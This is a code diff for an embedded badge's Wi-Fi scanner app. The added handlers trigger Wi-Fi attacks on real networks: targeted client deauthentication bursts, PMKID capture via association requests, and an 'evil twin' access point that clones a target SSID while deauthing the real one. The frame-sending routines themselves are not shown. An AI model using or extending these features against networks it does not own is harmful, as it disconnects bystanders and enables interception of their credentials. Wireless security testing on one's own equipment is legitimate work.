-    lv_chart_set_axis_range(ctx->chart, LV_CHART_AXIS_PRIMARY_Y, 0, SIGNAL_RANGE_DB);
-    // No vertical grid: its even spacing never lines up with the 13 channels and looked like a
-    // broken scale. The channel numbers under the chart are the horizontal scale instead.
-    lv_chart_set_div_line_count(ctx->chart, 3, 0);
-    lv_obj_set_style_size(ctx->chart, 0, 0, LV_PART_INDICATOR);
-    lv_obj_set_style_line_width(ctx->chart, 2, LV_PART_ITEMS);
-    lv_obj_remove_flag(ctx->chart, LV_OBJ_FLAG_SCROLLABLE);
-    for (int i = 0; i < MAX_SERIES; i++) {
-        ctx->series[i] = lv_chart_add_series(ctx->chart, lv_color_hex(SERIES_COLORS[i]), LV_CHART_AXIS_PRIMARY_Y);
-        lv_chart_hide_series(ctx->chart, ctx->series[i], true);
-    }
-
-    createChannelGrid(chartWrapper); // vertical reference lines on the channel numbers
-
-    ctx->labelLayer = lv_obj_create(chartWrapper);
-    lv_obj_set_size(ctx->labelLayer, LV_PCT(100), LV_PCT(100));
-    lv_obj_set_style_pad_all(ctx->labelLayer, 0, 0);
-    lv_obj_set_style_bg_opa(ctx->labelLayer, LV_OPA_TRANSP, 0);
-    lv_obj_set_style_border_width(ctx->labelLayer, 0, 0);
-    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_SCROLLABLE);
-    lv_obj_remove_flag(ctx->labelLayer, LV_OBJ_FLAG_CLICKABLE);
-
-    createAxisLabels(leftColumn);
-
-    // Four small icon buttons, stacked, pinned to the far right.
-    constexpr int BTN = 40;
-    auto* rightColumn = lv_obj_create(mainRow);
-    lv_obj_set_size(rightColumn, BTN, LV_PCT(100));
-    lv_obj_set_flex_flow(rightColumn, LV_FLEX_FLOW_COLUMN);
-    lv_obj_set_style_pad_all(rightColumn, 0, 0);
-    lv_obj_set_style_pad_row(rightColumn, 4, 0);
-    lv_obj_set_style_border_width(rightColumn, 0, 0);
-    lv_obj_remove_flag(rightColumn, LV_OBJ_FLAG_SCROLLABLE);
-
-    // WiFi = scansione normale (come la vecchia app) / "CH" = channel hopping (cattura passiva) /
-    // ferma tutto / lista reti. I client si vedono entrando nel dettaglio di una rete.
-    ctx->scanButton = createIconButton(rightColumn, LV_SYMBOL_WIFI, onStartScan, ctx, BTN);
-    ctx->captureButton = createIconButton(rightColumn, "CH", onStartCapture, ctx, BTN);
-    ctx->stopButton = createIconButton(rightColumn, LV_SYMBOL_STOP, onStop, ctx, BTN);
-    createIconButton(rightColumn, LV_SYMBOL_LIST, onShowList, ctx, BTN);
-    refreshModeButtons(ctx);
-}
-
-/** Adds a right-aligned fixed-width column label to the legend header (mirrors addFieldLabel). */
-void addLegendLabel(lv_obj_t* header, const char* text, int width) {
-    auto* label = lv_label_create(header);
-    lv_obj_set_width(label, width);
-    lv_obj_set_style_text_align(label, LV_TEXT_ALIGN_RIGHT, 0);
-    lv_label_set_text(label, text);
-}
-
-void createListPage(Context* ctx, lv_obj_t* parent) {
-    ctx->listPage = createPage(parent);
-    lv_obj_add_flag(ctx->listPage, LV_OBJ_FLAG_HIDDEN);
-
-    // Legend header, laid out with the same columns as the rows so the titles sit over their
-    // numbers. This lets the rows show bare numbers (no "ch"/"dBm" text eating width).
-    auto* header = lv_obj_create(ctx->listPage);
-    lv_obj_set_size(header, LV_PCT(100), 18);
-    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
-    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
-    lv_obj_set_style_pad_all(header, 2, 0);
-    lv_obj_set_style_pad_column(header, 4, 0);
-    lv_obj_set_style_border_width(header, 0, 0);
-    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
-    auto* spacer = lv_obj_create(header); // matches the row's 6px colour bar
-    lv_obj_set_size(spacer, 6, 1);
-    lv_obj_set_style_border_width(spacer, 0, 0);
-    lv_obj_set_style_bg_opa(spacer, LV_OPA_TRANSP, 0);
-    auto* nameHdr = lv_label_create(header);
-    lv_label_set_text(nameHdr, "Rete");
-    lv_obj_set_flex_grow(nameHdr, 1);
-    addLegendLabel(header, "ch", COL_CH);
-    addLegendLabel(header, "d/s", COL_POWER);
-    addLegendLabel(header, "sec", COL_SEC);
-    addLegendLabel(header, "cli", COL_CLI);
-
-    // lv_list (not a bare container): its buttons join the keypad group, so the badge's up/down
-    // keys move the focus and scroll the list - a custom container would not scroll.
-    ctx->list = lv_list_create(ctx->listPage);
-    lv_obj_set_width(ctx->list, LV_PCT(100));
-    lv_obj_set_flex_grow(ctx->list, 1);
-    // Zero the list's own horizontal padding so each row starts at the same x as the header above
-    // (the row's own 2px padding then matches the header's), keeping the columns lined up.
-    lv_obj_set_style_pad_all(ctx->list, 0, 0);
-    lv_obj_set_style_pad_row(ctx->list, 2, 0);
-}
-
-void createDetailPage(Context* ctx, lv_obj_t* parent) {
-    ctx->detailPage = createPage(parent);
-    lv_obj_add_flag(ctx->detailPage, LV_OBJ_FLAG_HIDDEN);
-    lv_obj_set_style_pad_all(ctx->detailPage, 4, 0);
-
-    // Everything lives in an lv_list so it scrolls with the badge keys. Two focusable buttons -
-    // "Client" at the top and "Connetti" at the bottom - give an up target and a down target, so
-    // the arrows scroll the page both ways (with a single button you could only go down).
-    auto* scroll = lv_list_create(ctx->detailPage);
-    lv_obj_set_width(scroll, LV_PCT(100));
-    lv_obj_set_flex_grow(scroll, 1);
-    ctx->detailScroll = scroll;
-
-    ctx->detailClientsButton = lv_list_add_button(scroll, LV_SYMBOL_LIST, "Client associati (0)");
-    lv_obj_add_event_cb(ctx->detailClientsButton, onShowClients, LV_EVENT_CLICKED, ctx);
-
-    if (isCaptureSupported()) {
-        ctx->detailLockButton = lv_list_add_button(scroll, LV_SYMBOL_GPS, "Cattura mirata");
-        lv_obj_add_event_cb(ctx->detailLockButton, onToggleLock, LV_EVENT_CLICKED, ctx);
-
-        // Red: this one actively disconnects real clients, unlike the other (passive) buttons.
-        ctx->detailDeauthButton = lv_list_add_button(scroll, LV_SYMBOL_WARNING, "Deauth");
-        lv_obj_set_style_bg_color(ctx->detailDeauthButton, lv_color_hex(0xB33A3A), 0);
-        lv_obj_set_style_bg_opa(ctx->detailDeauthButton, LV_OPA_50, 0);
-        lv_obj_add_event_cb(ctx->detailDeauthButton, onDeauthPressed, LV_EVENT_CLICKED, ctx);
-
-        // Right under Deauth, so you can tell at a glance whether it caught anything without
-        // scrolling down to the full "Handshake: ..." line.
-        ctx->detailHsSummary = lv_label_create(scroll);
-        lv_obj_set_width(ctx->detailHsSummary, LV_PCT(100));
-        lv_label_set_text(ctx->detailHsSummary, "HS: 0/4   PMKID: no");
-    }
-
-    ctx->detailInfo = lv_label_create(scroll);
-    lv_label_set_long_mode(ctx->detailInfo, LV_LABEL_LONG_MODE_WRAP);
-    lv_obj_set_width(ctx->detailInfo, LV_PCT(100));
-
-    ctx->connectButton = lv_list_add_button(scroll, LV_SYMBOL_WIFI, "Connetti");
-    lv_obj_add_event_cb(ctx->connectButton, onConnectPressed, LV_EVENT_CLICKED, ctx);
-}
-
-void createClientsPage(Context* ctx, lv_obj_t* parent) {
-    ctx->clientsPage = createPage(parent);
-    lv_obj_add_flag(ctx->clientsPage, LV_OBJ_FLAG_HIDDEN);
-
-    // Legend header lined up with the client row columns.
-    auto* header = lv_obj_create(ctx->clientsPage);
-    lv_obj_set_size(header, LV_PCT(100), 18);
-    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
-    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
-    lv_obj_set_style_pad_all(header, 2, 0);
-    lv_obj_set_style_pad_column(header, 4, 0);
-    lv_obj_set_style_border_width(header, 0, 0);
-    lv_obj_remove_flag(header, LV_OBJ_FLAG_SCROLLABLE);
-    auto* macHdr = lv_label_create(header);
-    lv_label_set_text(macHdr, "Client (MAC)");
-    lv_obj_set_flex_grow(macHdr, 1);
-    addLegendLabel(header, "dBm", COL_CDBM);
-    addLegendLabel(header, "TX", COL_TX);
-    addLegendLabel(header, "RX", COL_RX);
-
-    ctx->clientsList = lv_list_create(ctx->clientsPage);
-    lv_obj_set_width(ctx->clientsList, LV_PCT(100));
-    lv_obj_set_flex_grow(ctx->clientsList, 1);
-    lv_obj_set_style_pad_all(ctx->clientsList, 0, 0);
-    lv_obj_set_style_pad_row(ctx->clientsList, 2, 0);
-}
-
 void createWidgets(lv_obj_t* parent, void* userData) {
     auto* ctx = static_cast<Context*>(userData);
 
@@ -2139,7 +2548,21 @@ void createWidgets(lv_obj_t* parent, void* userData) {
     lv_obj_set_style_pad_row(parent, 0, LV_STATE_DEFAULT);
 
     ctx->toolbar = lvgl_toolbar_create(parent, "Wi-Fi Scanner");
-    lvgl_toolbar_set_nav_action(ctx->toolbar, LV_SYMBOL_CLOSE, onBackPressed, ctx);
+    lvgl_toolbar_set_nav_action(ctx->toolbar, LV_SYMBOL_CLOSE, [](lv_event_t* e) {
+        auto* ctx = static_cast<Context*>(lv_event_get_user_data(e));
+        Page current;
+        if (ctx->mutex.lock(250 / portTICK_PERIOD_MS)) {
+            current = ctx->page;
+            ctx->mutex.unlock();
+        } else {
+            return;
+        }
+        if (current == Page::Graph) {
+            app_event_emit_close(ctx->appInstanceId);
+        } else {
+            goBack(ctx);
+        }
+    }, ctx);
 
     auto* wrapper = lv_obj_create(parent);
     lv_obj_set_flex_flow(wrapper, LV_FLEX_FLOW_COLUMN);
@@ -2151,6 +2574,7 @@ void createWidgets(lv_obj_t* parent, void* userData) {
     createListPage(ctx, wrapper);
     createDetailPage(ctx, wrapper);
     createClientsPage(ctx, wrapper);
+    createEvilTwinDetailPage(ctx, wrapper);
 
     showPage(ctx, ctx->page);
 }
@@ -2172,15 +2596,29 @@ void destroyWidgets(void* userData) {
     ctx->rows.clear();
     ctx->detailPage = nullptr;
     ctx->detailScroll = nullptr;
-    ctx->detailInfo = nullptr;
     ctx->detailClientsButton = nullptr;
     ctx->detailLockButton = nullptr;
     ctx->detailDeauthButton = nullptr;
+    ctx->detailPmkidButton = nullptr;
+    ctx->detailEvilTwinButton = nullptr;
+    ctx->detailEvilTwinDetailsButton = nullptr;
     ctx->detailHsSummary = nullptr;
+    ctx->detailSsidLabel = nullptr;
+    ctx->detailMacLabel = nullptr;
+    ctx->detailSecLabel = nullptr;
+    ctx->detailChanLabel = nullptr;
+    ctx->detailPowerLabel = nullptr;
+    ctx->detailPhyLabel = nullptr;
+    ctx->detailTimeLabel = nullptr;
+    ctx->detailDeauthLabel = nullptr;
     ctx->connectButton = nullptr;
     ctx->clientsPage = nullptr;
     ctx->clientsList = nullptr;
     ctx->clientRows.clear();
+    ctx->etDetailPage = nullptr;
+    ctx->etStatusLabel = nullptr;
+    ctx->etClientsList = nullptr;
+    ctx->etLogToggleButton = nullptr;
 }
 
 int32_t appMain(int /*argc*/, char* /*argv*/[]) {
@@ -2197,10 +2635,8 @@ int32_t appMain(int /*argc*/, char* /*argv*/[]) {
     ctx.window = window_manager_create_ext(appInstanceId, createWidgets, destroyWidgets, &ctx);
 
     service::wifi::setScanRecords(MAX_RECORDS);
-    // Auto-connect scans would compete with this app's own scans and with capture.
     service::wifi::setAutoScanPaused(true);
 
-    // Remember the strip's current look so we can hand it back untouched when the app exits.
     saveLedConfig(&ctx);
 
     ctx.timer = std::make_unique<Timer>(Timer::Type::Periodic, REFRESH_MS, [&ctx] {
@@ -2238,25 +2674,107 @@ int32_t appMain(int /*argc*/, char* /*argv*/[]) {
                         currentMode = ctx.mode;
                         ctx.mutex.unlock();
                     }
-                    // Same reason the targeted-capture lock exists: off the target's channel,
-                    // the deauth frames just go out into whatever channel we're hopping through.
                     if (found && channel >= 1 && channel <= 13) {
                         if (currentMode != RadioMode::Capture) {
-                            // setMode() touches LVGL widgets (button states); this handler runs
-                            // on the app's own task, not the LVGL task, so it must hold the lock
-                            // itself (updateDetail()'s callers from onTimer do the same).
                             lvgl_lock();
                             setMode(&ctx, RadioMode::Capture);
                             lvgl_unlock();
                         }
                         setCaptureLockChannel(channel);
-                        // Blocks this task (waiting for the lock to actually take effect, then
-                        // the 6 burst blocks, a few seconds total) - fine, it's this app's own
-                        // dedicated task, not the LVGL or timer task.
-                        sendDeauthBurstOnChannel(bssid, channel);
+                        sendDeauthBurstOnChannel(bssid, channel, nullptr);
                         if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
                             ctx.deauthBurstsSent++;
                             ctx.mutex.unlock();
+                        }
+                    }
+                } else if (event.result.launch_id == ctx.clientDeauthDialogId.load() && event.result.result == 0) {
+                    uint8_t bssid[6];
+                    uint8_t clientMac[6];
+                    int channel = 0;
+                    bool found = false;
+                    RadioMode currentMode = RadioMode::Stopped;
+
+                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
+                        auto apIt = ctx.seen.find(ctx.selectedKey);
+                        auto clientIt = ctx.clients.find(ctx.targetClientKey);
+                        if (apIt != ctx.seen.end() && clientIt != ctx.clients.end()) {
+                            memcpy(bssid, apIt->second.record.bssid, 6);
+                            memcpy(clientMac, clientIt->second.mac, 6);
+                            channel = apIt->second.record.channel;
+                            found = true;
+                        }
+                        currentMode = ctx.mode;
+                        ctx.mutex.unlock();
+                    }
+
+                    if (found && channel >= 1 && channel <= 13) {
+                        if (currentMode != RadioMode::Capture) {
+                            lvgl_lock();
+                            setMode(&ctx, RadioMode::Capture);
+                            lvgl_unlock();
+                        }
+                        setCaptureLockChannel(channel);
+                        sendDeauthBurstOnChannel(bssid, channel, clientMac);
+                        if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
+                            ctx.deauthBurstsSent++;
+                            ctx.mutex.unlock();
+                        }
+                    }
+                } else if (event.result.launch_id == ctx.pmkidDialogId.load() && event.result.result == 0) {
+                    uint8_t bssid[6];
+                    char ssid[33] = {};
+                    int channel = 0;
+                    bool found = false;
+                    RadioMode currentMode = RadioMode::Stopped;
+                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
+                        auto it = ctx.seen.find(ctx.selectedKey);
+                        if (it != ctx.seen.end()) {
+                            memcpy(bssid, it->second.record.bssid, 6);
+                            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
+                            channel = it->second.record.channel;
+                            found = true;
+                        }
+                        currentMode = ctx.mode;
+                        ctx.mutex.unlock();
+                    }
+                    if (found && channel >= 1 && channel <= 13) {
+                        if (currentMode != RadioMode::Capture) {
+                            lvgl_lock();
+                            setMode(&ctx, RadioMode::Capture);
+                            lvgl_unlock();
+                        }
+                        setCaptureLockChannel(channel);
+                        sendAssociationRequestBurst(bssid, ssid, channel);
+                    }
+                } else if (event.result.launch_id == ctx.evilTwinDialogId.load() && event.result.result == 0) {
+                    uint8_t bssid[6];
+                    char ssid[33] = {};
+                    int channel = 0;
+                    bool found = false;
+                    bool activate = false;
+                    if (ctx.mutex.lock(250 / portTICK_PERIOD_MS)) {
+                        auto it = ctx.seen.find(ctx.selectedKey);
+                        if (it != ctx.seen.end()) {
+                            memcpy(bssid, it->second.record.bssid, 6);
+                            strncpy(ssid, it->second.record.ssid, sizeof(ssid) - 1);
+                            channel = it->second.record.channel;
+                            found = true;
+                        }
+                        ctx.evilTwinActive = !ctx.evilTwinActive;
+                        activate = ctx.evilTwinActive;
+                        ctx.mutex.unlock();
+                    }
+                    if (found && channel >= 1 && channel <= 13) {
+                        if (activate) {
+                            lvgl_lock();
+                            setMode(&ctx, RadioMode::Capture);
+                            lvgl_unlock();
+                            setCaptureLockChannel(channel);
+                            startEvilTwinAp(ssid[0] != '\0' ? ssid : "FreeWifi", channel);
+                            sendDeauthBurstOnChannel(bssid, channel, nullptr);
+                        } else {
+                            stopEvilTwinAp();
+                            setCaptureLockChannel(0);
                         }
                     }
                 }
@@ -2267,8 +2785,9 @@ int32_t appMain(int /*argc*/, char* /*argv*/[]) {
 
     stopTimer(&ctx);
     stopCapture(&ctx);
+    stopEvilTwinAp();
     service::wifi::setAutoScanPaused(false);
-    restoreLedConfig(&ctx); // give the strip back exactly as we found it
+    restoreLedConfig(&ctx);
 
     window_manager_remove(ctx.window);
     check(app_event_unsubscribe(&sub) == ERROR_NONE);
